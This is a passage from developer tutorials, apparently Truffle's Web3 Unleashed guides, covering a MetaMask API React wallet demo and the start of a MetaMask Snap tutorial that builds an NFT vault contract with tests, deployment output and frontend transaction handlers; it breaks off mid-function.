components/Wallet.tsx import Link from \"next/link\" ; import { useListen } from \"../hooks/useListen\" ; import { useMetamask } from \"../hooks/useMetamask\" ; import { Loading } from \"./Loading\" ; export default function Wallet () { const { dispatch , state : { status , isMetamaskInstalled , wallet , balance }, } = useMetamask (); const listen = useListen (); const showInstallMetamask = status !== \"pageNotLoaded\" && ! isMetamaskInstalled ; const showConnectButton = status !== \"pageNotLoaded\" && isMetamaskInstalled && ! wallet ; const isConnected = status !== \"pageNotLoaded\" && typeof wallet === \"string\" ; const handleConnect = async () => { dispatch ({ type : \"loading\" }); const accounts = await window . ethereum . request ({ method : \"eth_requestAccounts\" , }); if ( accounts . length > 0 ) { const balance = await window . ethereum ! . request ({ method : \"eth_getBalance\" , params : [ accounts [ 0 ], \"latest\" ], }); dispatch ({ type : \"connect\" , wallet : accounts [ 0 ], balance }); // we can register an event listener for changes to the users wallet listen (); } }; const handleDisconnect = () => { dispatch ({ type : \"disconnect\" }); }; const handleAddUsdc = async () => { dispatch ({ type : \"loading\" }); await window . ethereum . request ({ method : \"wallet_watchAsset\" , params : { type : \"ERC20\" , options : { address : \"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48\" , symbol : \"USDC\" , decimals : 18 , image : \"https://cryptologos.cc/logos/usd-coin-usdc-logo.svg?v=023\" , }, }, }); dispatch ({ type : \"idle\" }); }; return ( < div className = \"bg-truffle\" > < div className = \"mx-auto max-w-2xl py-16 px-4 text-center sm:py-20 sm:px-6 lg:px-8\" > < h2 className = \"text-3xl font-bold tracking-tight text-white sm:text-4xl\" > < span className = \"block\" > Metamask API intro < /span> < /h2> < p className = \"mt-4 text-lg leading-6 text-white\" > Follow along with the { \" \" } < Link href = \"https://github.com/GuiBibeau/web3-unleashed-demo\" target = \"_blank\" > < span className = \"underline cursor-pointer\" > Repo < /span> < /Link>{\" \"} in order to learn how to use the Metamask API . < /p> { wallet && balance && ( < div className = \" px-4 py-5 sm:px-6\" > < div className = \"-ml-4 -mt-4 flex flex-wrap items-center justify-between sm:flex-nowrap\" > < div className = \"ml-4 mt-4\" > < div className = \"flex items-center\" > < div className = \"ml-4\" > < h3 className = \"text-lg font-medium leading-6 text-white\" > Address : < span > { wallet } < /span> < /h3> < p className = \"text-sm text-white\" > Balance : { \" \" } < span > {( parseInt ( balance ) / 1000000000000000000 ). toFixed ( 4 )}{ \" \" } ETH < /span> < /p> < /div> < /div> < /div> < /div> < /div> )} { showConnectButton && ( < button onClick = { handleConnect } className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > { status === \"loading\" ? < Loading /> : \"Connect Wallet\" } < /button> )} { showInstallMetamask && ( < Link href = \"https://metamask.io/\" target = \"_blank\" > < a className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > Install Metamask < /a> < /Link> )} { isConnected && ( < div className = \"flex w-full justify-center space-x-2\" > < button onClick = { handleAddUsdc } className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > { status === \"loading\" ? < Loading /> : \"Add Token\" } < /button> < button onClick = { handleDisconnect } className = \"mt-8 inline-flex w-full items-center justify-center rounded-md border border-transparent bg-ganache text-white px-5 py-3 text-base font-medium sm:w-auto\" > Disconnect < /button> < /div> )} < /div> < /div> ); } Finally, we will update our pages/index.tsx file with a useEffect to wrap all of these final changes up. Update pages/index/tsx import type { NextPage } from \"next\" ; import { useEffect } from \"react\" ; import Wallet from \"../components/Wallet\" ; import { useListen } from \"../hooks/useListen\" ; import { useMetamask } from \"../hooks/useMetamask\" ; const Home : NextPage = () => { const { dispatch } = useMetamask (); const listen = useListen (); useEffect (() => { if ( typeof window !== undefined ) { // start by checking if window.ethereum is present, indicating a wallet extension const ethereumProviderInjected = typeof window . ethereum !== \"undefined\" ; // this could be other wallets so we can verify if we are dealing with metamask // using the boolean constructor to be explecit and not let this be used as a falsy value (optional) const isMetamaskInstalled = ethereumProviderInjected && Boolean ( window . ethereum . isMetaMask ); const local = window . localStorage . getItem ( \"metamaskState\" ); // user was previously connected, start listening to MM if ( local ) { listen (); } // local could be null if not present in LocalStorage const { wallet , balance } = local ? JSON . parse ( local ) : // backup if local storage is empty { wallet : null , balance : null }; dispatch ({ type : \"pageLoaded\" , isMetamaskInstalled , wallet , balance }); } }, []); return ( <> < Wallet /> < /> ); }; export default Home ; In this last page update to pages/index.tsx , we have relocated the useEffect from the hooks/useMetaMask.tsx page. This hook is consuming dispatch , so the proper next step would be to create a layout page with NextJS, but, since we only have one page, we simply added this code here. We have updated our hooks/useMetamask.tsx page's PageLoadAction to include wallet and balance as well as the code required to access our local storage and rehydrate our app. With those changes in place we have also updated our components/Wallet.tsx page to use our useListen hook since we are using that code in multiple places now, updated the showAddToken variable to a more descriptive name of isConnected , and added a handleDisconnect() function to dispatch an action clearing local storage in our browser. This also required a slight update to our JSX/HTML to display our buttons more neatly. Checkout the Diff to see what changed", "title": "More UX Goodies"}, {"location": "guides/metamask-api/#remove-listeners-after-disconnect", "text": "We have one final change we want to make to ensure that we stop listening to changes once the user has disconnected their wallet. We will update the and files. This will make the TypeScript definitions file aware of the removeAllListeners() method we will be using, as well as adding the necessary code to the disconnect case inside the metamaskReducer . Update types.d.ts file: type InjectedProviders = { isMetaMask? : true ; }; interface Window { ethereum : InjectedProviders & { on : ( ...args : any []) => void ; removeListener : ( ...args : any []) => void ; removeAllListeners : ( ...args : any []) => void ; request < T = any > ( args : any ) : Promise < T > ; }; } Update the case statement in the useMetamask.tsx file to: case \"disconnect\" : { window . localStorage . removeItem ( \"metamaskState\" ); if ( typeof window . ethereum !== undefined ) { window . ethereum . removeAllListeners ([ \"accountsChanged\" ]); } return { ... state , wallet : null , balance : null }; } Again, here we have ensured that all listeners added after connecting the wallet stop listening once the user is disconnected. You can always switch to the final branch of this repo to get to the completed state of this demo. This concludes the demo! But you're just getting started; for a challenge, try updating the UI, try to add functionality to switch chains, and overall, have fun. If you have any questions or need help with MetaMask, reach out to our DevRel team on Twitter. You can contact Gui Bibeau and Eric Bishard with any questions or feedback. One final note, Gui has a great resource and blog called frontend-devops where he waxes poetically about web, full stack development, and UX which. A great resource for Web2 developers getting into Web3 and seasoned developers alike!", "title": "Remove Listeners after Disconnect"}, {"location": "guides/metamask-api/#connect-with-us", "text": "If you want to talk about this content, make suggestions for what you'd like to see, or ask questions about the series, join our Discord ! See other episodes here . Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Connect with us"}, {"location": "guides/metamask-snap/", "text": "Web3 Unleashed: How to build a MetaMask snap \u00b6 Written by Emily Lin and Christian Montoya Last updated 12/16/2022 Overview \u00b6 In this episode of Web3 Unleashed, we'll be covering MetaMask Snaps, a new way to extend your MetaMask functionality. Snaps product manager Christian Montoya and engineer Guillaume Roux will be joining us to talk about what they are, how they work, and how you can get started building one! Specifically, we'll be leveraging the Truffle Snaps box to build a wallet experience that provides insights into your wallet transactions. Watch our livestream for a more detailed walkthrough! You can read more about Snaps here . The completed code lives here . Create an Infura account and project \u00b6 To connect your DApp to Ethereum mainnet and testnets, you'll need an Infura account. Sign up for an account here Install a MetaMask Flask wallet \u00b6 To interact with your DApp in the browser, you'll need a MetaMask Flask wallet. You can download it and create one here . Make sure to install Flask in a new browser profile or disable any existing installed versions of MetaMask. Running multiple instances of MetaMask in the same browser profile will break dapp interactions. Download System Requirements \u00b6 You'll need to install: Node.js , v14 or higher truffle ganache CLI yarn v3.x, run corepack enable if you are using Node v16 or higher Download VS Code \u00b6 Feel free to use whatever IDE you want, but we highly recommend using VS Code! You can run through most of this tutorial using the Truffle extension to create, build, and deploy your smart contracts, all without using the CLI! You can read more about it here . Set Up Your Project \u00b6 In this project, we'll start off using the MetaMask Snap Truffle box to scaffold our project! truffle unbox metamask/snap-box tx-snap cd tx-snap Then, set up your development environment by running: yarn install && yarn start Once ganache gets started, make sure you copy paste and save off the mnemonic, account numbers, and private keys! You'll be able to get the account numbers again, but will not be able to retrieve the mnemonic and private keys. If you would like these numbers to be stable, add in your own mnemonic. The output looks something like this: YN0000: [ truffle ] : mnemonic used: often innocent sphere luggage almost leaf faint fan goat lab swim use \u27a4 YN0000: [ truffle ] : { \u27a4 YN0000: [ truffle ] : '0x49abb8858966f2d4b2b983e7ea5104c0f6cf495a' : { \u27a4 YN0000: [ truffle ] : secretKey: '0xf67606f22f122dcf7f6c2ee6a942a4d0bc1da6e2bc0a007b1547408dd2537eba' , \u27a4 YN0000: [ truffle ] : balance: 1000000000000000000000n, \u27a4 YN0000: [ truffle ] : unlocked: true \u27a4 YN0000: [ truffle ] : } , \u27a4 YN0000: [ truffle ] : '0x7318563db067c3ffaa81d82f77d176e7a8cde704' : { \u27a4 YN0000: [ truffle ] : secretKey: '0x6a6698b543e5c5a1af7c199187757fda1ebcf6c7490eecad4ee79ff44de84b45' , \u27a4 YN0000: [ truffle ] : balance: 1000000000000000000000n, ... Additionally, note that if you restart this test instance, you'll have to redeploy your contracts and reconnect your Snap to get the most up to date contract addresses. So, if you want to persist transaction history, consider using ganache's dbPath option. Alternatively, feel free to just set up your own instance of ganache through the cli ! This is just a convenience script to help you get started, but you can run ganache in a separate terminal and in the background using ganache --detach ! You can read more about the different options here . And clean up some files that are only useful within the GitHub organization: ./scripts/cleanup.sh What's in the box? \u00b6 This box not only sets up the basic MetaMask Snap template, but adds in additional scaffolding to demonstrate how you might incorporate smart contract interactions within your Snap flow. We'll step through the most important parts of this Truffle box. packages/snap/src/index.ts \u00b6 We will be editing this file to customize our snap! In the Truffle box, the example snap simply displays a custom confirmation screen. export const onRpcRequest : OnRpcRequestHandler = ({ origin , request }) => { switch ( request . method ) { case 'hello' : return wallet . request ({ method : 'snap_confirm' , params : [ { prompt : getMessage ( origin ), description : 'This custom confirmation is just for display purposes.' , textAreaContent : 'But you can edit the snap source code to make it do something, if you want to!' , }, ], }); default : throw new Error ( 'Method not found.' ); } }; If you want your snap to communicate with an external dapp or other snap, a snap must implement its own JSON-RPC API by exporting the function onRpcRequest . Since we want to display a custom confirmation screen in the MetaMask UI, we send the method snap_confirm via wallet.request to be processed by MetaMask. packages/snap/snap.manifest.json \u00b6 This file tells MetaMask important information about your snap. Important pieces to highlight in the manifest: description : the description of your snap proposedName : the name of your snap source.location : where your snap is published source.shasum : the hash of your source code to verify the integrity of the snap when called initialPermissions : this specifies the permissions a snap can have packages/snap/snap.config.js \u00b6 This file is used to override the Snaps cli options and should not be published. You can get more detail on what makes up a snap in the MetaMask documentation here . packages/site/src/utils/snap.ts \u00b6 This file contains all the methods necessary to interact with a snap in your frontend application. To interact with the MetaMask Snaps API, we call the relevant methods using window.ethereum.request : getSnaps calls wallet_getSnaps to get the user's permitted Snaps. connectSnap calls wallet_enable to install/connect Snaps to the user's account. The snapId is the location of the installed snap. getSnap gets a specific snap object. sendHello calls wallet_invokeSnap to call the JSON-RPC method of the specified snap. In this tutorial, the snap is installed locally, specified as local:http://localhost:8080 . Then, this method calls the hello case as defined by the onRpcRequest method we defined earlier in packages/snap/src/index.ts . packages/truffle \u00b6 This folder contains a basic Truffle project that is set up for you to write, deploy, and test your smart contracts. Currently, it is populated with a SimpleStorage contract that does not interact with the snap. We will be modifying this later! packages/truffle/scripts/ganache.js \u00b6 In the example snap that we are building in this guide, we will be connecting to ganache, our local test chain. This script programmatically sets up an instance of ganache that forks Ethereum mainnet. Let's get building! \u00b6 We will start off by building an NFT vault that allows users to deposit and store their NFTs securely by requiring a second signer to approve withdrawals. Then, we'll create a snap that surfaces transaction insights during withdrawal to let the user know whether or not the NFT is actually approved for withdrawal. Create the smart contracts \u00b6 In order to build the NFT vault, go to the packages/truffle directory and create two smart contracts and a test: cd packages/truffle truffle create contract SimpleNFT truffle create contract NFTVault truffle create test NftVault Let's also install packages we'll need later: yarn add @openzeppelin/contracts yarn add --dev @openzeppelin/test-helpers Create SimpleNFT \u00b6 We'll be using Open Zeppelin's ERC721URIStorage contract to create SimpleNFT . This is simply so that we can quickly mint NFTs for testing. The code looks like this: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\" ; import \"@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol\" ; import \"@openzeppelin/contracts/utils/Counters.sol\" ; contract SimpleNFT is ERC721URIStorage { using Counters for Counters . Counter ; Counters . Counter private _tokenIds ; event NFTMinted ( uint256 ); constructor () ERC721 ( \"SimpleNFT\" , \"SNFT\" ) {} function mint ( string memory _tokenURI ) public { _tokenIds . increment (); uint256 newTokenId = _tokenIds . current (); _safeMint ( msg . sender , newTokenId ); _setTokenURI ( newTokenId , _tokenURI ); emit NFTMinted ( newTokenId ); } } If you want a deeper dive into the methods of this NFT, see our tutorial on creating an NFT here . Create NFTVault \u00b6 The completed code for the NFTVault looks like this: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; import \"@openzeppelin/contracts/interfaces/IERC721.sol\" ; contract NFTVault { struct approval { address owner ; address secondSigner ; bool approved ; } // map nftContract => nftID => approval mapping ( address => mapping ( uint256 => approval )) private approvals ; function depositNFT ( address nftContract , uint tokenId , address secondSigner ) public { require ( approvals [ nftContract ][ tokenId ]. owner == address ( 0 ), \"NFT already deposited!\" ); approvals [ nftContract ][ tokenId ] = approval ( msg . sender , secondSigner , false ); IERC721 ( nftContract ). transferFrom ( msg . sender , address ( this ), tokenId ); } function withdrawNFT ( address nftContract , uint tokenId ) public { approval memory data = approvals [ nftContract ][ tokenId ]; require ( data . owner != address ( 0 ), \"NFT not deposited\" ); require ( data . owner == msg . sender , \"Not owner of the NFT\" ); require ( data . approved , \"Second signer has not signed approval\" ); IERC721 ( nftContract ). safeTransferFrom ( address ( this ), data . owner , tokenId ); delete approvals [ nftContract ][ tokenId ]; } function approveWithdraw ( address nftContract , uint tokenId ) public { approval storage data = approvals [ nftContract ][ tokenId ]; require ( data . secondSigner == msg . sender , \"Not an approver\" ); if ( ! data . approved ) { data . approved = true ; } } function getApproval ( address nftContract , uint tokenId ) public view returns ( address , address , bool ) { approval memory data = approvals [ nftContract ][ tokenId ]; return ( data . owner , data . secondSigner , data . approved ); } function removeApproval ( address nftContract , uint tokenId ) public { approval storage data = approvals [ nftContract ][ tokenId ]; require ( data . secondSigner == msg . sender , \"Not an approver\" ); if ( data . approved ) { data . approved = false ; } } } Let's step through the code! First, we create an approval struct in order to store the relevant information about each deposited NFT: the address of the owner, the address of the second approver, and whether or not the second signer has approved the NFT for withdrawal. struct approval { address owner ; address secondSigner ; bool approved ; } Then, we create an approvals mapping that maps the NFT contract address and token id to an approval struct to store information about each deposited NFT. // map nftContract => nftID => approval mapping ( address => mapping ( uint256 => approval )) private approvals ; Now, let's dive into the meat of the smart contract, the methods! This smart contract consists of a few methods: function depositNFT ( address nftContract , uint tokenId , address secondSigner ) public { require ( approvals [ nftContract ][ tokenId ]. owner == address ( 0 ), \"NFT already deposited!\" ); approvals [ nftContract ][ tokenId ] = approval ( msg . sender , secondSigner , false ); IERC721 ( nftContract ). transferFrom ( msg . sender , address ( this ), tokenId ); } depositNFT transfers ownership of the NFT to the smart contract and stores who the second signer is to approve for withdrawal. Note that this requires that the NFTVault contract was first approved to make transfers. This call would have to happen before the depositNFT function is called by calling the approve method on the NFT smart contract. You can read more about the approve method here . function withdrawNFT ( address nftContract , uint tokenId ) public { approval memory data = approvals [ nftContract ][ tokenId ]; require ( data . owner != address ( 0 ), \"NFT not deposited\" ); require ( data . owner == msg . sender , \"Not owner of the NFT\" ); require ( data . approved , \"Second signer has not signed approval\" ); IERC721 ( nftContract ). safeTransferFrom ( address ( this ), data . owner , tokenId ); delete approvals [ nftContract ][ tokenId ]; } withdrawNFT transfers ownership of the NFT from the smart contract to the user. We retrieve the approval data to check that the withdrawer was actually the owner of the NFT and the NFT was approved to be withdrawn by the second signer. Afterwards, we transfer the NFT from the smart contract back to the owner and delete this NFT information from the stored data. function approveWithdraw ( address nftContract , uint tokenId ) public { approval storage data = approvals [ nftContract ][ tokenId ]; require ( data . secondSigner == msg . sender , \"Not an approver\" ); if ( ! data . approved ) { data . approved = true ; } } approveWithdraw should be called by the second signer to approve the NFT for withdrawal. Note that we get data using the storage key word. This is because we want to actually change the data stored in the contract. function getApproval ( address nftContract , uint tokenId ) public view returns ( address , address , bool ) { approval memory data = approvals [ nftContract ][ tokenId ]; return ( data . owner , data . secondSigner , data . approved ); } getApproval is a read method that returns approval information about an NFT to be used by the MetaMask snap. Note that we cannot return structs in solidity. Instead, we return an array of information as defined by (address, address, bool) . function removeApproval ( address nftContract , uint tokenId ) public { approval storage data = approvals [ nftContract ][ tokenId ]; require ( data . secondSigner == msg . sender , \"Not an approver\" ); if ( data . approved ) { data . approved = false ; } } removeApproval is called by the second signer of an NFT to revoke their approval. Create the migration script \u00b6 We need to tell Truffle how to deploy our contracts by writing a migration script. Create 1_deploy_contracts.js under the packages/truffle/migration folder: const SimpleNFT = artifacts . require ( 'SimpleNFT' ); const NFTVault = artifacts . require ( 'NFTVault' ); module . exports = function ( deployer ) { deployer . deploy ( SimpleNFT ); deployer . deploy ( NFTVault ); }; Write tests \u00b6 The completed test code looks like this: require ( \"@openzeppelin/test-helpers/configure\" )({ provider : web3 . currentProvider , singletons : { abstraction : \"truffle\" , }, }); const { constants , expectRevert } = require ( \"@openzeppelin/test-helpers\" ); const NFTVault = artifacts . require ( \"NFTVault\" ); const SimpleNFT = artifacts . require ( \"SimpleNFT\" ); async function mintNft ( simpleNFT , sender ) { txn = await simpleNFT . mint ( \"fakeURI\" , { from : sender }); return txn . logs [ 1 ]. args [ 0 ]. toNumber (); } function assertApproval ( actual , expected ) { assert . equal ( actual [ 0 ], expected . owner , \"owner is not correct\" ); assert . equal ( actual [ 1 ], expected . secondSigner , \"secondSigner is not correct\" ); assert . equal ( actual [ 2 ], expected . approved , \"approved is not correct\" ); } contract ( \"NFTVault\" , function ( accounts ) { const tokenOwner = accounts [ 1 ]; const secondSigner = accounts [ 2 ]; let nftVault ; let simpleNFT ; let tokenId ; before ( 'should reuse variables' , async () => { nftVault = await NFTVault . deployed (); simpleNFT = await SimpleNFT . deployed (); }); beforeEach ( 'should mint and deposit NFT' , async () => { tokenId = ( await mintNft ( simpleNFT , tokenOwner , { from : tokenOwner })); await simpleNFT . approve ( nftVault . address , tokenId , { from : tokenOwner }); await nftVault . depositNFT ( simpleNFT . address , tokenId , secondSigner , { from : tokenOwner }); }); it ( \"should deposit NFT with correct data and should not deposit twice\" , async function () { let expected = { owner : tokenOwner , secondSigner : secondSigner , approved : false }; assertApproval ( await nftVault . getApproval ( simpleNFT . address , tokenId ), expected ); assert . equal ( await simpleNFT . ownerOf ( tokenId ), nftVault . address ); await expectRevert ( nftVault . depositNFT ( simpleNFT . address , tokenId , secondSigner , { from : tokenOwner }), \"NFT already deposited!\" ); }); it ( \"should not approve withdrawal if not second signer\" , async function () { await expectRevert ( nftVault . approveWithdraw ( simpleNFT . address , tokenId , { from : accounts [ 3 ]}), \"Not an approver\" ); }); it ( \"should approve withdrawal if second signer\" , async function () { await nftVault . approveWithdraw ( simpleNFT . address , tokenId , { from : secondSigner }); let expected = { owner : tokenOwner , secondSigner : secondSigner , approved : true }; assertApproval ( await nftVault . getApproval ( simpleNFT . address , tokenId ), expected ); }); it ( \"should not withdraw if not owner\" , async function () { await expectRevert ( nftVault . withdrawNFT ( simpleNFT . address , tokenId , { from : accounts [ 3 ]}), \"Not owner of the NFT\" ); }); it ( \"should not withdraw if not approved\" , async function () { await expectRevert ( nftVault . withdrawNFT ( simpleNFT . address , tokenId , { from : tokenOwner }), \"Second signer has not signed approval\" ); }); it ( \"should withdraw and not withdraw twice\" , async function () { await nftVault . approveWithdraw ( simpleNFT . address , tokenId , { from : secondSigner }); await nftVault . withdrawNFT ( simpleNFT . address , tokenId , { from : tokenOwner }); let expected = { owner : constants . ZERO_ADDRESS , secondSigner : constants . ZERO_ADDRESS , approved : false } assertApproval ( await nftVault . getApproval ( simpleNFT . address , tokenId ), expected ); assert . equal ( await simpleNFT . ownerOf ( tokenId ), tokenOwner ); await expectRevert ( nftVault . withdrawNFT ( simpleNFT . address , tokenId , { from : tokenOwner }), \"NFT not deposited\" ); }); it ( \"should not remove approval if not second signer\" , async function () { await expectRevert ( nftVault . removeApproval ( simpleNFT . address , tokenId , { from : accounts [ 3 ]}), \"Not an approver\" ); }); it ( \"should remove approval if second signer\" , async function () { await nftVault . removeApproval ( simpleNFT . address , tokenId , { from : secondSigner }); let expected = { owner : tokenOwner , secondSigner : secondSigner , approved : false } assertApproval ( await nftVault . getApproval ( simpleNFT . address , tokenId ), expected ); }); }); Let's go through the highlights: @openzeppelin/test-helpers gives us some nifty utilities like constants for the zero address, and expectRevert to help us check that our require statements are correctly failing async function mintNft(simpleNFT, sender) is a helper function to quickly mint an NFT for testing function assertApproval(actual, expected) is a helper function that asserts whether or not the actual approval object has the same properties as the expected approval object beforeEach will mint, approve, and deposit an NFT before each test so that we are starting with fresh data each time Run the tests! \u00b6 If you ran yarn start earlier, it should've brought up an instance of ganache on 8545, which is the development network defined in truffle-config.js . Then, just run truffle test and the output should look like this: Contract: NFTVault \u2714 should deposit NFT with correct data \u2714 should not approve withdrawal if not second signer ( 272ms ) \u2714 should approve withdrawal if second signer \u2714 should not withdraw if not owner \u2714 should not withdraw if not approved \u2714 should withdraw ( 175ms ) \u2714 should not remove approval if not second signer \u2714 should remove approval if second signer 8 passing ( 3s ) Create the frontend of your dapp! \u00b6 In order to interact with the NFT Vault, we'll be building a quick site. This guides assumes you already have basic familiarity with React. Edit packages/truffle/truffle-config.js \u00b6 In order for our frontend to be able to interact with our deployed contracts, we'll need to modify the directory where our smart contract builds are written to. Let's add it into our snap src folder. Modify the contracts_build_directory property as follows: contracts_build_directory : '../snap/src/contracts' , Now, we want to actually deploy these contracts! Call: truffle migrate You should see something like this: Compiling your contracts... =========================== > Compiling ./contracts/NFTVault.sol > Compiling ./contracts/SimpleNFT.sol > Compiling @openzeppelin/contracts/interfaces/IERC721.sol > Compiling @openzeppelin/contracts/token/ERC721/ERC721.sol > Compiling @openzeppelin/contracts/token/ERC721/IERC721.sol > Compiling @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol > Compiling @openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol > Compiling @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol > Compiling @openzeppelin/contracts/utils/Address.sol > Compiling @openzeppelin/contracts/utils/Context.sol > Compiling @openzeppelin/contracts/utils/Counters.sol > Compiling @openzeppelin/contracts/utils/Strings.sol > Compiling @openzeppelin/contracts/utils/introspection/ERC165.sol > Compiling @openzeppelin/contracts/utils/introspection/IERC165.sol > Compiling @openzeppelin/contracts/utils/math/Math.sol > Artifacts written to /Users/emilylin/dev/unleashed/unleashed_mm_snap/packages/snap/src/contracts > Compiled successfully using: - solc: 0 .8.14+commit.80d49f37.Emscripten.clang Migrations dry-run ( simulation ) =============================== > Network name: 'development-fork' > Network id: 1 > Block gas limit: 30000000 ( 0x1c9c380 ) 1_deploy_contracts.js ===================== Deploying 'SimpleNFT' --------------------- > block number: 16190737 > block timestamp: 1671115535 > account: 0x28d2db1E78C3871c34A5BA44Fe5d40c7486B0259 > balance: 999 .9367138314506932 > gas used: 2460810 ( 0x258c8a ) > gas price: 2 .794796691 gwei > value sent: 0 ETH > total cost: 0 .00687746364517971 ETH Deploying 'NFTVault' -------------------- > block number: 16190738 > block timestamp: 1671115535 > account: 0x28d2db1E78C3871c34A5BA44Fe5d40c7486B0259 > balance: 999 .934619651128490245 > gas used: 757665 ( 0xb8fa1 ) > gas price: 2 .763992427 gwei > value sent: 0 ETH > total cost: 0 .002094180322202955 ETH ------------------------------------- > Total cost: 0 .008971643967382665 ETH Summary ======= > Total deployments: 2 > Final cost: 0 .008971643967382665 ETH Starting migrations... ====================== > Network name: 'development' > Network id: 1 > Block gas limit: 30000000 ( 0x1c9c380 ) 1_deploy_contracts.js ===================== Deploying 'SimpleNFT' --------------------- > transaction hash: 0x0414b54b0b3cbe8714dbc8f73bc2faa3227685513064648f767e96d16069072f > Blocks: 0 Seconds: 0 > contract address: 0x888111C9F5Fe423154838060C4207BF1a0D267A2 > block number: 16190736 > block timestamp: 1671115535 > account: 0x28d2db1E78C3871c34A5BA44Fe5d40c7486B0259 > balance: 999 .93671366001836455 > gas used: 2460810 ( 0x258c8a ) > gas price: 2 .794866356 gwei > value sent: 0 ETH > total cost: 0 .00687763507750836 ETH Deploying 'NFTVault' -------------------- > transaction hash: 0xb36b12cca3831a9d73ef958ba037682754193fa2312468ce349e4a8d2c1bbafe > Blocks: 0 Seconds: 0 > contract address: 0xa00b4BD107EAB10825ec93066aBF57162b11Ee44 > block number: 16190737 > block timestamp: 1671115535 > account: 0x28d2db1E78C3871c34A5BA44Fe5d40c7486B0259 > balance: 999 .934619432428472905 > gas used: 757665 ( 0xb8fa1 ) > gas price: 2 .764054813 gwei > value sent: 0 ETH > total cost: 0 .002094227589891645 ETH > Saving artifacts ------------------------------------- > Total cost: 0 .008971862667400005 ETH Summary ======= > Total deployments: 2 > Final cost: 0 .008971862667400005 ETH Edit packages/site/src/pages/index.tsx \u00b6 First, let's clean up the parts of the code we won't be using - specifically, remove any references to the HelloWorld snap: The sendHello and SendHelloButton imports The handleSendHelloClick function The sendHello card First, we'll want to change into the packages/site directory to start installing the ethers package there: cd ../site yarn add ethers Then, we'll add that as an import to the top of the packages/site/src/pages/index.tsx page and add useState and useEffect to the list of imports from react . We also want to use our contract information so we'll import the built Truffle files as well. import { useContext , useState , useEffect } from 'react' ; import { ethers } from 'ethers' ; import SimpleNFT from 'snap/src/contracts/SimpleNFT.json' ; import NFTVault from 'snap/src/contracts/NFTVault.json' ; If we want to interact with the smart contracts, we'll be using ethers to create a contract interface abstraction. To do this, we'll need the contract abi, address, and provider. Add the following code to the Index function: const [ networkId , setNetworkId ] = useState < unknown > (); useEffect (() => { const run = async () => { setNetworkId ( await window . ethereum . request ({ method : 'net_version' })); } const handleChainChanged = async () => { setNetworkId ( await window . ethereum . request ({ method : 'net_version' })); } window . ethereum . on ( 'chainChanged' , handleChainChanged ); run (); }, []); const simpleNFTContractAddress = networkId ? ( SimpleNFT . networks [ networkId ] ? SimpleNFT . networks [ networkId ]. address : null ) : null ; const simpleNFTInterface = new ethers . utils . Interface ( SimpleNFT . abi ); const NFTVaultContractAddress = networkId ? ( NFTVault . networks [ networkId ] ? NFTVault . networks [ networkId ]. address : null ) : null ; const NFTVaultInterface = NFTVaultContractAddress ? new ethers . utils . Interface ( NFTVault . abi ) : null ; To pull out the important pieces: We use await window.ethereum.request({ method: 'net_version' }) to get the networkId and listen for the chainChanged event in case the user changes networks We get address and abi information from truffle's build files We use new ethers.utils.Interface(SimpleNFT.abi) to get the contract interface abstraction for encoding Then, we simply add additional cards and relevant handlers to interact with the contract! Note that in this tutorial, we're deliberately encoding the function data ourselves instead of passing a ethers.Contract abstraction . This is because we want to demonstrate the encoding to decoding flow. In Index , add: const mintNFTHandler = async ( e : Event ) => { e . preventDefault (); const data = new FormData ( e . target ); const tokenURI = \"\" + data . get ( \"mintNFTtokenURI\" ); const functionData = simpleNFTInterface . encodeFunctionData ( 'mint' ,[ tokenURI ]); // Get the user's account from MetaMask. try { const [ from ] = ( await window . ethereum . request ({ method : 'eth_requestAccounts' , })) as string []; // Send a transaction to MetaMask. await window . ethereum . request ({ method : 'eth_sendTransaction' , params : [ { from : from , to : simpleNFTContractAddress , value : '0x0' , data : functionData , }, ], }); } catch ( e ) { console . error ( e ); } }; const approveVaultHandler = async ( e : Event ) => { e . preventDefault (); const data = new FormData ( e . target ); const address = \"\" + data . get ( \"contractAddressToApprove\" ); const tokenId = parseInt ( data . get ( \"tokenIdToApprove\" )); const functionData = simpleNFTInterface . encodeFunctionData ( 'approve' ,[ NFTVaultContractAddress , tokenId ]); try { const [ from ] = ( await window . ethereum . request ({ method : 'eth_requestAccounts' , })) as string []; // Send a transaction to MetaMask. await window . ethereum . request ({ method : 'eth_sendTransaction' , params : [ { from : from , to : address , value : '0x0' , data : functionData , }, ], }); } catch ( e ) { console . error ( e ); } }; const depositToVaultHandler = async ( e : Event ) => { e . preventDefault (); const data = new FormData ( e . target ); const nftAddress = \"\" + data . get ( \"nftAddressToDeposit\" ); const tokenId = parseInt ( data . get ( \"nftTokenIdToDeposit\" )); const secondSigner = \"\" + data . get ( \"secondSigner\" ); const functionData = NFTVaultInterface . encodeFunctionData ( 'depositNFT' ,[ nftAddress , tokenId , secondSigner ]); try { const [ from ] = ( await window . ethereum . request ({ method : 'eth_requestAccounts' , })) as string []; // Send a transaction to MetaMask. await window . ethereum . request ({ method : 'eth_sendTransaction' , params : [ { from : from , to : NFTVaultContractAddress , value : '0x0' , data : functionData , }, ], }); } catch ( e ) { console . error ( e ); } }; const approveWithdrawHandler = async ( e : Event ) => { e . preventDefault (); const data = new FormData ( e . target ); const nftAddress = \"\" + data . get ( \"nftAddressToApprove\" ); const tokenId = parseInt ( data . get ( \"nftTokenIdToApprove\" )); const functionData = NFTVaultInterface . encodeFunctionData ( 'approveWithdraw' ,[ nftAddress , tokenId ]); try { const [ from ] = ( await window . ethereum . request ({ method : 'eth_requestAccounts' , })) as string []; // Send a transaction to MetaMask. await window . ethereum . request ({ method : 'eth_sendTransaction' , params : [ { from : from , to : NFTVaultContractAddress , value : '0x0' , data : functionData , }, ], }); } catch ( e ) { console . error ( e ); } }; const withdrawHandler = async ( e : Event ) => { e . 